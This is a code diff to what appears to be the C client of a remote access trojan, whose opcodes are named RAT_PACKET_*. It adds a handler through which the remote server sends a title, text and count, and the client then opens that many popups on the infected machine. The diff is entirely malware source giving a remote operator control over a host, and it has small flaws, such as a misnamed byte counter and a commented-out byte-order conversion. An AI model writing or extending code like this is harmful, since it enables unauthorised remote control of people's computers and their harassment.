@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <winsock.h>
 
 int client(int debug) {
   AddrInfo *result, *ptr, hints;
@@ -73,6 +74,15 @@ int client(int debug) {
       break;
     case RAT_PACKET_DISCONNECT:
       goto DONE;
+    case RAT_PACKET_ALERT:
+      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
+      alert_t *alert = (alert_t *)p->data;
+      // alert->amount = ntohl(alert->amount);
+      LOG_DEBUG("received alert title=\"%s\" text\"%s\" amount=\"%d\"",
+                alert->title, alert->text, alert->amount);
+      for (; alert->amount > 0; alert->amount--)
+        popup(alert->title, alert->text);
+      break;
     default:
       LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
                 p->op);
